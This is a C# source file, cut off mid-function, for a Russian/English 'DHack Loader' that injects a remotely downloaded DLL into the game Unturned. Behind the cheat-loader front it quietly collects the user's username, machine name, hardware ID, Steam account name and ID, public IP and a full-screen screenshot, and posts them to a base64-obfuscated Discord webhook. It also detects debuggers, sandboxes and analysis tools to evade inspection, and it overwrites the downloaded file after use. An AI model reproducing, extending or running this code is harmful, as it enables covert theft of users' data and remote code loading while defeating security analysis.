using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;
using Newtonsoft.Json;
using SharpMonoInjector;

namespace Unturend_Injector
{
    internal class Program
    {
        private const string ObfuscatedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1NzAzMDQxNzQ2NjkyMTA0MC9hRllxSDZnek9WRUl0YkFBTDNUSm0wTXRHZTgzZEFPSERrU1FzR21NMk5XR2pyeUV2YWpnVjVnMy15bmkzTVE3V0NIQw==";


        [DllImport("ntdll.dll", SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern int NtQueryInformationThread(nint threadHandle, int threadInformationClass, ref THREAD_BASIC_INFORMATION threadInformation, int threadInformationLength, out int returnLength);

        [DllImport("kernel32.dll")]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool CloseHandle(nint hObject);

        [DllImport("user32.dll")]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern nint GetDesktopWindow();

        [DllImport("user32.dll")]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern nint GetWindowDC(nint hWnd);

        [DllImport("user32.dll")]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern int GetSystemMetrics(int nIndex);


        [DllImport("gdi32.dll")]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool BitBlt(nint hdcDest, int xDest, int yDest, int wDest, int hDest, nint hdcSrc, int xSrc, int ySrc, int rasterOp);

        [DllImport("kernel32.dll")]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern nint OpenThread(int dwDesiredAccess, bool bInheritHandle, int dwThreadId);

        [DllImport("kernel32.dll")]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool GetThreadContext(nint hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern nint GetCurrentThread();

        [StructLayout(LayoutKind.Sequential)]
        private struct THREAD_BASIC_INFORMATION
        {
            public int ExitStatus;
            public nint TebBaseAddress;
            public int ClientId;
            public int AffinityMask;
            public int Priority;
            public int BasePriority;
            public int SuspendCount;
        }

        private const int SRCCOPY = 0x00CC0020;
        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;
        private const int THREAD_QUERY_INFORMATION = 0x0040;
        private static volatile bool _isSuspended;
        private static readonly string[] BadProcesses = { "SystemInformer", "ProcessHacker", "HTTPDebugger", "Fiddler", "Wireshark", "Procmon", "Netmon", "Regmon", "Sandboxie", "x64dbg", "x32dbg", "dnSpy", "CheatEngine", "HxD", "ImmunityDebugger", "OllyDbg", "MegaDumper" };
        private static ManagementEventWatcher _processWatcher;
        private static Thread _monitoringThread;

        private const string TargetDll = "DHackLoader.dll";

        private static async Task Main(string[] args)
        {
            BypassChecks();
            Console.OutputEncoding = Encoding.UTF8;
            if (!IsRunningAsAdmin()) { ShowErrorAndExit("English", LanguageKeys.AdminRequired); return; }

            string selectedLanguage = SelectLanguage(); // Выбор языка ДОЛЖЕН быть первым
            ShowLoaderInfo(selectedLanguage); // Передаем выбранный язык

            bool debugMode = CheckDebugMode(selectedLanguage); // Передаем выбранный язык

            string hwid = GetHWID();
            StartSuspendMonitor(selectedLanguage, debugMode);
            StartProcessMonitor(selectedLanguage);

            if (CheckSecurityEnvironment(debugMode, selectedLanguage))
            {
                ShowErrorAndExit(selectedLanguage, LanguageKeys.SecurityAlert, "Security violation detected! Closing...");
                return;
            }

            await SecurityReport(hwid, debugMode).ConfigureAwait(false);
            await RunInjectorAsync(debugMode, selectedLanguage, hwid).ConfigureAwait(false);
        }

        private static void StartProcessMonitor(string language)
        {
            _monitoringThread = new Thread(() =>
            {
                try
                {
                    WqlEventQuery startQuery = new("__InstanceCreationEvent", new TimeSpan(0, 0, 1), "TargetInstance isa 'Win32_Process'");
                    _processWatcher = new ManagementEventWatcher(startQuery);
                    _processWatcher.EventArrived += (sender, e) =>
                    {
                        try
                        {
                            ManagementBaseObject targetInstance = (ManagementBaseObject)e.NewEvent["TargetInstance"];
                            string processName = targetInstance["Name"].ToString();
                            int processId = Convert.ToInt32(targetInstance["ProcessId"]);
                            if (BadProcesses.Any(p => processName.Contains(p, StringComparison.OrdinalIgnoreCase)))
                            {
                                HandleSecurityViolation(language, processName, processId);
                            }
                        }
                        catch { }
                    };
                    _processWatcher.Start();
                    while (true)
                    {
                        Thread.Sleep(1000);
                    }
                }
                catch (Exception ex) { Logger.Log($"Process monitoring failed: {ex.Message}", ConsoleColor.Red); }
            })
            { IsBackground = true };
            _monitoringThread.Start();
        }

        private static void HandleSecurityViolation(string language, string processName, int pid)
        {
            Console.Beep(3000, 500);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"\n{GetLanguageValue(language, "SecurityViolationDetected")}\n{processName} (PID: {pid})");
            Console.ResetColor();
            _ = SendToDiscordWebhook(
                $"🛑 {GetLanguageValue(language, "SecurityViolationDetected")}\n" +
                $"{GetLanguageValue(language, "Process")}: {processName}\n" +
                $"PID: {pid}\n" +
                $"{GetLanguageValue(language, "User")}: {Environment.UserName}\n" +
                $"{GetLanguageValue(language, "Machine")}: {Environment.MachineName}",
                "error",
                false
            );
            Environment.Exit(1);
        }
        private static bool CheckSecurityEnvironment(bool debugMode, string language)
        {
            bool securityIssue = CheckExistingProcesses(language, debugMode); // Передаем debugMode

            if (!debugMode)
            {
                securityIssue |= CheckDebugger()
                               || CheckAnalysisTools()
                               || CheckHardwareBreakpoints(debugMode)
                               || CheckSuspendedState(debugMode);
            }

            return securityIssue;
        }

        private static bool CheckExistingProcesses(string language, bool debugMode)
        {
            // Если дебаг включен - игнорируем некоторые процессы
            IEnumerable<string> filteredProcesses = debugMode
                ? BadProcesses.Where(p => !p.Equals("HTTPDebugger", StringComparison.Ordinal))
                : BadProcesses;

            List<Process> processes = Process.GetProcesses()
                .Where(p => filteredProcesses.Contains(p.ProcessName, StringComparer.OrdinalIgnoreCase))
                .ToList();

            if (processes.Any())
            {
                Logger.Log($"[SECURITY] Tools detected: {string.Join(", ", processes.Select(p => p.ProcessName))}", ConsoleColor.Red);
                return true;
            }
            return false;
        }

        private static bool CheckDebugger()
        {
            return Debugger.IsAttached || Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING") == "1";
        }

        private static bool CheckAnalysisTools()
        {
            string[] analysisTools = { "joebox", "cuckoo", "anubis", "wireshark", "fiddler", "netmon", "Sysmon" };
            return Process.GetProcesses()
                .Any(p => analysisTools.Contains(p.ProcessName, StringComparer.OrdinalIgnoreCase));
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags;
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
        }



        private static bool CheckHardwareBreakpoints(bool debugMode)
        {
            if (debugMode)
            {
                return false;
            }

            try
            {
                CONTEXT context = new() { ContextFlags = 0x10 };
                return GetThreadContext(GetCurrentThread(), ref context) && (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0);
            }
            catch { return false; }
        }


        private static async Task RunInjectorAsync(bool debugMode, string selectedLanguage, string hwid)
        {
            string dllPath = Path.Combine(Path.GetTempPath(), TargetDll);
            try
            {
                CleanupOldFiles(new[] { dllPath }, debugMode);
                Process targetProcess = await FindOrStartUnturnedProcess(selectedLanguage, debugMode).ConfigureAwait(false);

                if (targetProcess == null || !ValidateProcess(targetProcess, selectedLanguage, debugMode))
                {
                    await SendErrorToDiscord("Process Validation Failed", "Target process not found", debugMode).ConfigureAwait(false);
                    Pause(selectedLanguage);
                    return;
                }

                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("\n" + string.Format(GetLanguageValue(selectedLanguage, "DownloadingFile"), TargetDll));
                Console.ResetColor();

                if (!await DownloadFileWithProgress("https://www.dropbox.com/scl/fi/0qh67q1y0hje883sap5ub/DHackLoader.dll?rlkey=5jqnufl1e9dcxrp01vyzltycm&st=hvziuz0v&dl=1",
                    dllPath, selectedLanguage, debugMode, TargetDll).ConfigureAwait(false))
                {
                    await SendErrorToDiscord("DLL Download Failed", "Failed to download DLL", debugMode).ConfigureAwait(false);
                    Pause(selectedLanguage);
                    return;
                }

                (bool Success, string ErrorMessage) = InjectDll(targetProcess.Id, dllPath, selectedLanguage, debugMode);

                if (!Success)
                {
                    await SendErrorToDiscord("Injection Failed", $"Error: {ErrorMessage}", debugMode).ConfigureAwait(false);
                    Pause(selectedLanguage);
                    return;
                }

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n" + string.Format(GetLanguageValue(selectedLanguage, "InjectionSuccess"), TargetDll));
                Console.ResetColor();

                byte[] screenshot = CaptureScreenshot();
                await SendInjectionReport(targetProcess, screenshot, debugMode).ConfigureAwait(false);
                CleanupOldFiles(new[] { dllPath }, debugMode);
                await MonitorProcessAsync(targetProcess, selectedLanguage, debugMode).ConfigureAwait(false);
            }
            catch (Exception ex)
            {
                await SendErrorToDiscord("Critical Error", ex.Message, debugMode).ConfigureAwait(false);
                Logger.Log($"Critical error: {ex}", ConsoleColor.Red);
            }
            finally
            {
                SecureDelete(dllPath, 3);
                CleanMonitoringResources();
            }
            Logger.Log(GetLanguageValue(selectedLanguage, "InjectorFinished"), ConsoleColor.Blue);
            Pause(selectedLanguage);
        }

        private static async Task<Process> StartNewProcess(string language, bool debugMode)
        {
            List<string> possiblePaths = GetPossibleExecutablePaths();
            string validPath = possiblePaths.FirstOrDefault(File.Exists);

            if (validPath == null)
            {
                Logger.Log(string.Format(GetLanguageValue(language, "ExeNotFoundMultiple"),
                    string.Join("\n", possiblePaths)), ConsoleColor.Red);
                return null;
            }

            try
            {
                Logger.Log(string.Format(GetLanguageValue(language, "ProcessNotFound"), "Unturned"), ConsoleColor.Yellow);
                Process process = Process.Start(new ProcessStartInfo
                {
                    FileName = validPath,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Normal
                });

                if (process == null)
                {
                    Logger.Log(GetLanguageValue(language, "ProcessStartFailed"), ConsoleColor.Red);
                    return null;
                }

                Logger.Log(string.Format(GetLanguageValue(language, "ProcessStarted"), process.Id), ConsoleColor.Green);

                for (int i = 0; i < 10; i++)
                {
                    Process p = GetTargetProcess("Unturned");
                    if (p != null)
                    {
                        return p;
                    }

                    await Task.Delay(1000).ConfigureAwait(false);
                    if (debugMode)
                    {
                        Console.Write($"\rWaiting for process initialization... {i + 1}/10");
                    }
                }

                Logger.Log(GetLanguageValue(language, "ProcessInitFailed"), ConsoleColor.Red);
                return null;
            }
            catch (Exception ex)
            {
                Logger.Log($"Process start failed: {ex.Message}", ConsoleColor.Red);
                return null;
            }
        }

        // Исправляем синтаксическую ошибку в FindOrStartUnturnedProcess
        private static async Task<Process> FindOrStartUnturnedProcess(string language, bool debugMode)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\n" + string.Format(GetLanguageValue(language,LanguageKeys.LookingForProcess), "Unturned")); // Добавлена недостающая )
            Console.ResetColor();

            Process targetProcess = GetTargetProcess("Unturned");
            if (targetProcess != null)
            {
                Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ProcessFound),
                    targetProcess.ProcessName, targetProcess.Id), ConsoleColor.Green);
                return targetProcess;
            }

            return await StartNewProcess(language, debugMode).ConfigureAwait(false);
        }


        // Добавляем недостающий метод SendInjectionReport
        private static async Task SendInjectionReport(Process process, byte[] screenshot, bool debugMode)
        {
            string message = $"✅ Successful injection\nPID: {process.Id}\nRuntime: {DateTime.Now:HH:mm:ss}";
            if (screenshot == null)
            {
                message += "\n⚠️ Screenshot capture failed";
            }

            await SendToDiscordWebhook(message, "success", debugMode, screenshot).ConfigureAwait(false);
        }

        private static void SecureDelete(string path, int passes)
        {
            try
            {
                if (!File.Exists(path))
                {
                    return;
                }

                File.SetAttributes(path, FileAttributes.Normal);
                long length = new FileInfo(path).Length;
                using (FileStream fs = new(path, FileMode.Open))
                {
                    for (int i = 0; i < passes; i++)
                    {
                        byte[] randomData = new byte[length];
                        using RandomNumberGenerator rng = RandomNumberGenerator.Create();
                        rng.GetBytes(randomData);
                        fs.Write(randomData, 0, randomData.Length);
                        fs.Flush();
                    }
                }
                File.Delete(path);
                if (File.Exists(path))
                {
                    File.Delete(path);
                }
            }
            catch{}
        }

        private static void CleanMonitoringResources()
        {
            try { _processWatcher?.Stop(); _processWatcher?.Dispose(); _ = (_monitoringThread?.Join(1000)); } catch { }
        }

        private static (bool Success, string ErrorMessage) InjectDll(int processId, string dllPath, string language, bool debugMode)
        {
            try
            {
                using Injector injector = new(processId);
                _ = injector.Inject(File.ReadAllBytes(dllPath), "DHackLoader", "EntryPoint", "Entry");
                Logger.Log(GetLanguageValue(language, "InjectionSuccess"), ConsoleColor.Green);
                return (true, null);
            }
            catch (InjectorException ex) { return (false, $"Mono injection failed: {ex.Message}"); }
            catch (Exception ex) { return (false, $"General error: {ex.Message}"); }
        }

        private static string GetLanguageValue(string language, string key)
        {
            try
            {
                if (Languages.TryGetValue(language, out Dictionary<string, string> langDict) && langDict.TryGetValue(key, out string value))
                {
                    return value;
                }
                return $"[[LANGUAGE ERROR: {key}]]"; // Graceful fallback
            }
            catch
            {
                return "[[LANGUAGE SYSTEM FAILURE]]";
            }
        }

        private static void BypassChecks()
        {
            try
            {
                FieldInfo flags = typeof(Assembly).GetField("m_flags", BindingFlags.NonPublic | BindingFlags.Instance);
                if (flags != null)
                {
                    foreach (Assembly asm in AppDomain.CurrentDomain.GetAssemblies())
                    {
                        flags.SetValue(asm, (int)flags.GetValue(asm) | 0x80);
                    }
                }
            }
            catch { }
        }

        private static void StartSuspendMonitor(string language, bool debugMode)
        {
            new Thread(() =>
            {
                while (!_isSuspended)
                {
                    if (CheckSuspendedState(debugMode)) // Передаем debugMode
                    {
                        Console.Beep(3000, 500);
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"\n=== {GetLanguageValue(language, "SuspendDetected")} ===");
                        Console.WriteLine(GetLanguageValue(language, "SystemInformerDetected"));
                        Console.ResetColor();
                        _isSuspended = true;
                        Environment.Exit(1);
                    }
                    Thread.Sleep(250);
                }
            })
            { IsBackground = true }.Start();
        }

        private static bool CheckSuspendedState(bool debugMode)
        {
            try
            {
                foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
                {
                    nint threadHandle = OpenThread(THREAD_QUERY_INFORMATION, false, thread.Id);
                    if (threadHandle == nint.Zero)
                    {
                        continue;
                    }

                    THREAD_BASIC_INFORMATION tbi = new();
                    int status = NtQueryInformationThread(threadHandle, 0, ref tbi, Marshal.SizeOf(tbi), out _);
                    _ = CloseHandle(threadHandle);
                    if (status == 0 && tbi.SuspendCount > 0)
                    {
                        return true;
                    }
                }
                return CheckHardwareBreakpoints(debugMode); // Было IsHardwareBreakpointPresent
            }
            catch { return false; }
        }


        private static string SelectLanguage()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write(GetLanguageValue("English", LanguageKeys.LanguagePrompt));
            string languageChoice = Console.ReadLine();
            string selectedLang = "English"; // Default to English

            if (languageChoice == "2")
            {
                selectedLang = "Russian";
            }
            else if (languageChoice != "1")
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(GetLanguageValue("English", "InvalidChoice"));
            }

            try
            {
                // Verify language package exists
                if (!Languages.ContainsKey(selectedLang))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Missing language package: {selectedLang}");
                    selectedLang = "English";
                }
            }
            catch { /* Ignore errors in error handling */ }

            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"\nSelected language: {selectedLang}\n");
            Console.ResetColor();
            return selectedLang;
        }

        private static bool CheckDebugMode(string language)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write(GetLanguageValue(language, "DebugPasswordPrompt"));

            // Hidden password input
            string input = "";
            ConsoleKeyInfo key;
            do
            {
                key = Console.ReadKey(true);
                if (key.Key != ConsoleKey.Enter)
                {
                    input += key.KeyChar;
                }
            }
            while (key.Key != ConsoleKey.Enter);

            Console.WriteLine(); // Add line break after hidden input

            if (!string.IsNullOrEmpty(input) && input != "Kepka123")
            {
                _ = SendToDiscordWebhook(
                    $"{GetLanguageValue(language, "FailedDebugAttempt")}\n" +
                    $"Input:[HIDDEN]\n" +  // Hide actual input in logs
                    $"{GetLanguageValue(language, "User")}: {Environment.UserName}\n" +
                    $"{GetLanguageValue(language, "Machine")}: {Environment.MachineName}",
                    "warning",
                    false
                );
            }

            bool debugMode = input == "Kepka123";
            Console.ForegroundColor = debugMode ? ConsoleColor.Green : ConsoleColor.Yellow;
            Console.WriteLine(GetLanguageValue(language, debugMode ? "DebugModeEnabled" : "DebugModeDisabled"));
            Console.ResetColor();
            return debugMode;
        }

        private static void ShowErrorAndExit(string language, string key, string formatArg = null)
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.Red;
                string message = GetLanguageValue(language, key);
                if (formatArg != null)
                {
                    message = string.Format(message, formatArg);
                }
                Console.WriteLine(message);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Critical localization error: {ex.Message}");
            }
            Console.ResetColor();
            Thread.Sleep(2000);
            Environment.Exit(1);
        }

        private static bool IsRunningAsAdmin()
        {
            using WindowsIdentity identity = WindowsIdentity.GetCurrent();
            return new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void ShowLoaderInfo(string language)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;

            // Получаем ASCII-арт из ресурсов
            string asciiArt = GetLanguageValue(language, LanguageKeys.AsciiArt);
            Console.WriteLine(asciiArt);

            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"\nDHack Loader v{GetAssemblyVersion()}");
            Console.WriteLine(GetLanguageValue(language, LanguageKeys.LoadingDll));
            Console.WriteLine(GetLanguageValue(language, LanguageKeys.WelcomeMessage));
            Console.ResetColor();
            QuickLoadingAnimation(3);
        }

        private static void QuickLoadingAnimation(int seconds)
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            DateTime endTime = DateTime.Now.AddSeconds(seconds);
            int counter = 0;
            string[] spinner = { "|", "/", "-", "\\" };
            while (DateTime.Now < endTime)
            {
                Console.Write($"\rInitializing {spinner[counter++ % spinner.Length]}");
                Thread.Sleep(100);
            }
            Console.WriteLine("\n");
            Console.ResetColor();
        }

        private static async Task SecurityReport(string hwid, bool debugMode)
        {
            (string Username, string Steam64Id) = GetSteamUser();
            await SendToDiscordWebhook($"🔍 New User Detected\nUser: {Environment.UserName}\nMachine: {Environment.MachineName}\nOS: {Environment.OSVersion.VersionString}\nHWID: {hwid}\nSteam User: {Username}\nSteam64 ID: {Steam64Id}\nIP: {await GetPublicIpAsync().ConfigureAwait(false)}", "warning", debugMode).ConfigureAwait(false);
        }

        private static async Task SendToDiscordWebhook(string message, string status, bool debugMode, byte[] screenshot = null)
        {
            try
            {
                using HttpClient client = new();
                var embed = new { title = status switch { "success" => "✅ Successful Injection", "warning" => "⚠️ Security Alert", "error" => "❌ Injection Error", _ => "ℹ️ Injection Info" }, description = message, color = status switch { "success" => 65280, "warning" => 16753920, "error" => 16711680, _ => 255 }, timestamp = DateTime.UtcNow.ToString("o"), footer = new { text = $"Dhack Loader v{GetAssemblyVersion()}" }, author = new { name = Environment.MachineName } };
                var payload = new { username = "Dhack Security Monitor", content = "**Notification from Injector**", embeds = new[] { embed } };
                string jsonPayload = JsonConvert.SerializeObject(payload);
                using MultipartFormDataContent content = new() { { new StringContent(jsonPayload, Encoding.UTF8, "application/json"), "payload_json" } };
                if (screenshot != null)
                {
                    byte[] compressedScreenshot = CompressScreenshot(screenshot); using ByteArrayContent contentPart = new(compressedScreenshot);
                    content.Add(contentPart, "file", "screenshot.jpg");
                }
                HttpResponseMessage response = await client.PostAsync(GetDiscordWebhookUrl(), content).ConfigureAwait(false);
                if (debugMode && !response.IsSuccessStatusCode)
                {
                    Console.WriteLine($"[ERROR] Failed to send request: {response.StatusCode}, Response: {await response.Content.ReadAsStringAsync().ConfigureAwait(false)}");
                }

                if (response.StatusCode == System.Net.HttpStatusCode.NotFound)
                {
                    ShowWebhookError();
                }
                else
                {
                    _ = response.EnsureSuccessStatusCode();
                }
            }
            catch (HttpRequestException) { ShowWebhookError(); }
            catch { }
        }

        private static void ShowWebhookError()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("\n\n███████╗██████╗  ██████╗ ██████╗ ███████╗██████╗ ███████╗██████╗ ");
            Console.WriteLine("██╔════╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗");
            Console.WriteLine("█████╗  ██████╔╝██║   ██║██████╔╝█████╗  ██║  ██║█████╗  ██████╔╝");
            Console.WriteLine("██╔══╝  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║  ██║██╔══╝  ██╔══██╗");
            Console.WriteLine("███████╗██║  ██║╚██████╔╝██║  ██║███████╗██████╔╝███████╗██║  ██║");
            Console.WriteLine("╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n▄█▀█▄  КРИТИЧЕСКИЙ СБОЙ ВЕБХУКА  ▄█▀█▄");
            Console.WriteLine("█▀████▀█ <ВЕБХУК УНИЧТОЖЕН> █▀████▀█");
            Console.WriteLine("█░▀░░░▀░█   СИСТЕМА В ОТКАЗЕ   █░▀░░░▀░█");
            Console.WriteLine("░░░│▴│░░░   Error Code: DHX22   ░░░│▴│░░░");
            Console.WriteLine("═══╧═╧════════════════════════════╧═╧═══");
            Console.ForegroundColor = ConsoleColor.White;
            Console.BackgroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("\n⚠️  ПОДДЕРЖКА: Присоединяйтесь к Discord серверу Exploit Hub  ⚠️");
            Console.WriteLine("\n⚠️  HELP: Join community of Exploit Hub  ⚠️");
            Console.WriteLine("\n⚠️  LINK / ССЫЛКА (05.04.2025): https://discord.gg/rhUj7zWf8Y ");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\n░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░");
            Console.WriteLine("░░                                                            ░░");
            Console.WriteLine("░░  СИСТЕМА БУДЕТ ПРИНУДИТЕЛЬНО ЗАКРЫТА ЧЕРЕЗ 5 СЕКУНД...      ░░");
            Console.WriteLine("░░                                                            ░░");
            Console.WriteLine("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░");
            for (int i = 0; i < 3; i++)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("\n\nПРЕДУПРЕЖДЕНИЕ: ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.BackgroundColor = ConsoleColor.Red;
                Console.WriteLine(" НЕВОЗМОЖНО ВОССТАНОВИТЬ СЕССИЮ! ");
                Console.ResetColor();
                Thread.Sleep(500);
            }
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("\n\nДля выхода нажмите любую клавишу...");
            Console.CursorVisible = false;
            _ = Console.ReadKey();
            Environment.Exit(1);
        }

        private static byte[] CaptureScreenshot()
        {
            try
            {
                int screenWidth = GetSystemMetrics(SM_CXSCREEN);
                int screenHeight = GetSystemMetrics(SM_CYSCREEN);
                using Bitmap bitmap = new(screenWidth, screenHeight);
                using Graphics g = Graphics.FromImage(bitmap);
                nint hdcSrc = GetWindowDC(GetDesktopWindow());
                nint hdcDest = g.GetHdc();
                _ = BitBlt(hdcDest, 0, 0, screenWidth, screenHeight, hdcSrc, 0, 0, SRCCOPY);
                g.ReleaseHdc(hdcDest);
                using MemoryStream ms = new();
                bitmap.Save(ms, ImageFormat.Png);
                return ms.ToArray();
            }
            catch { return null; }
        }

        private static byte[] CompressScreenshot(byte[] screenshot)
        {
            try
            {
                using MemoryStream inputStream = new(screenshot);
                using MemoryStream outputStream = new();
                using Image image = Image.FromStream(inputStream);
                EncoderParameters encoderParams = new(1) { Param = { [0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 75L) } };
                ImageCodecInfo jpegCodec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(codec => codec.FormatID == ImageFormat.Jpeg.Guid);
                if (jpegCodec != null)
                {
                    image.Save(outputStream, jpegCodec, encoderParams);
                }

                return outputStream.ToArray();
            }
            catch { return screenshot; }
        }

        private static string GetDiscordWebhookUrl()
        {
            byte[] data = Convert.FromBase64String(ObfuscatedWebhook);
            return Encoding.UTF8.GetString(data);
        }

        private static string GetAssemblyVersion()
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            Version version = assembly.GetName().Version;
            AssemblyConfigurationAttribute configurationAttribute = assembly.GetCustomAttribute<AssemblyConfigurationAttribute>();
            return $"{version} ({configurationAttribute?.Configuration ?? "Unknown"})";
        }

        private static string GetHWID()
        {
            try
            {
                using RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography");
                return key?.GetValue("MachineGuid")?.ToString() ?? "Unknown";
            }
            catch { return "Unknown"; }
        }

        private static (string Username, string Steam64Id) GetSteamUser()
        {
            try
            {
                string steamConfigPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam", "config", "loginusers.vdf");
                if (File.Exists(steamConfigPath))
                {
                    string[] lines = File.ReadAllLines(steamConfigPath);
                    for (int i = 0; i < lines.Length; i++)
                    {
                        string line = lines[i].Trim();
                        if (line.Equals("\"users\"", StringComparison.OrdinalIgnoreCase))
                        {
                            i++; // Move to line after "users"
                            if (i < lines.Length && lines[i].Trim() == "{")
                            {
                                i++; // Enter users block
                                while (i < lines.Length)
                                {
                                    string currentLine = lines[i].Trim();
                                    if (currentLine == "}")
                                    {
                                        break; // Exit users block
                                    }

                                    // Check for SteamID64 key (quoted string)
                                    if (currentLine.StartsWith("\"") && currentLine.EndsWith("\"") && !currentLine.Contains(' '))
                                    {
                                        string steamId = currentLine.Trim('"');
                                        i++; // Move to next line (should be "{")
                                        if (i < lines.Length && lines[i].Trim() == "{")
                                        {
                                            i++; // Enter user block
                                            string accountName = "Unknown";
                                            bool mostRecent = false;

                                            while (i < lines.Length)
                                            {
                                                string userLine = lines[i].Trim();
                                                if (userLine == "}")
                                                {
                                                    i++;
                                                    break; // Exit user block
                                                }

                                                // Extract AccountName
                                                if (userLine.StartsWith("\"AccountName\"", StringComparison.OrdinalIgnoreCase))
                                                {
                                                    string[] parts = userLine.Split(new[] { '\"' }, StringSplitOptions.RemoveEmptyEntries);
                                                    if (parts.Length >= 3)
                                                    {
                                                        accountName = parts[2];
                                                    }
                                                }

                                                // Check MostRecent flag
                                                if (userLine.StartsWith("\"MostRecent\"", StringComparison.OrdinalIgnoreCase))
                                                {
                                                    string[] parts = userLine.Split(new[] { '\"' }, StringSplitOptions.RemoveEmptyEntries);
                                                    if (parts.Length >= 3 && parts[2] == "1")
                                                    {
                                                        mostRecent = true;
                                                    }
                                                }

                                                i++;
                                            }

                                            if (mostRecent)
                                            {
                                                return (accountName, steamId);
                                            }
                                        }
                                    }
                                    else
                                    {
                                        i++;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch { }
            return ("Unknown", "Unknown");
        }

        private static async Task<string> GetPublicIpAsync()
        {
            try
            {
                using HttpClient client = new();
                return await client.GetStringAsync("https://api.ipify.org").ConfigureAwait(false);
            }
            catch { return "Unknown"; }
        }

        private static async Task<bool> DownloadFileWithProgress(string url, string savePath, string language, bool debugMode, string displayName)
        {
            try
            {
                using HttpClient client = new();
                HttpResponseMessage response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead).ConfigureAwait(false);
                _ = response.EnsureSuccessStatusCode();
                _ = Directory.CreateDirectory(Path.GetDirectoryName(savePath));
                using Stream stream = await response.Content.ReadAsStreamAsync().ConfigureAwait(false);
                using FileStream fileStream = new(savePath, FileMode.Create);
                long totalBytes = response.Content.Headers.ContentLength ?? -1L;
                byte[] buffer = new byte[8192];
                long bytesRead = 0L;
                int lastPercentage = -1;
                Console.CursorVisible = false;
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine(string.Format(GetLanguageValue(language, "DownloadingFile"), displayName));
                Console.ResetColor();
                while (true)
                {
                    int read = await stream.ReadAsync(buffer).ConfigureAwait(false);
                    if (read == 0)
                    {
                        break;
                    }

                    await fileStream.WriteAsync(buffer.AsMemory(0, read)).ConfigureAwait(false);
                    bytesRead += read;
                    int currentPercentage = (int)((double)bytesRead / (totalBytes != -1 ? totalBytes : bytesRead) * 100);
                    if (currentPercentage != lastPercentage) { lastPercentage = currentPercentage; UpdateProgressBar(currentPercentage); }
                }
                Console.CursorVisible = true;
                Console.WriteLine("\n");
                if (!File.Exists(savePath))
                {
                    return false;
                }

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(string.Format(GetLanguageValue(language, "DownloadComplete"), displayName));
                Console.ResetColor();
                return true;
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
